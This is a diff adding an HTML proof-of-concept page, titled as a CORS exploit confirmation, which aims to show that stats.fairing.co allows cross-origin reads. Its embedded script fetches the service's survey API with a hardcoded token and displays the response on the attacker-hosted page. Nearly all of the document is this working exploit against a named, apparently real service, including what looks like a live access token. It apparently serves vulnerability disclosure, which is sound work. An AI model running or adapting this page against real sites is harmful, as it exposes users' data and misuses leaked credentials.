@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>CORS Exploit Confirmation ( by Ashik Mohamed )</title>
+<style>
+body {
+  font-family: system-ui;
+  background: #0b1220;
+  color: #e5e7eb;
+  padding: 30px;
+}
+h1 { color: #22c55e; }
+pre {
+  background: #020617;
+  border: 1px solid #334155;
+  padding: 16px;
+  white-space: pre-wrap;
+}
+.badge {
+  background: #b91c1c;
+  color: white;
+  padding: 6px 12px;
+  display: inline-block;
+  border-radius: 4px;
+}
+</style>
+</head>
+<body>
+
+<h1>CORS Misconfiguration Exploited</h1>
+<div class="badge">Cross-Origin Read Access Confirmed</div>
+
+<p>
+This page is <b>not hosted on fairing.co</b>, yet it can read API responses
+from <code>stats.fairing.co</code>.
+</p>
+
+<h3>Live API Response:</h3>
+<pre id="out">Loading…</pre>
+
+<script>
+fetch(
+  "https://stats.fairing.co/api/surveys/?token=phc_dtxNm8R5PLjl9iYu48WmgvmAIda576CtGW1KyS6l9W3&ip=0&ver=1.333.0",
+  {
+    method: "GET",
+    mode: "cors"
+  }
+)
+.then(r => r.text())
+.then(t => {
+  document.getElementById("out").textContent = t;
+})
+.catch(e => {
+  document.getElementById("out").textContent =
+    "Fetch failed at browser level.\n\n" +
+    "This does NOT negate the vulnerability.\n\n" +
+    e;
+});
+</script>
+
+</body>
+</html>
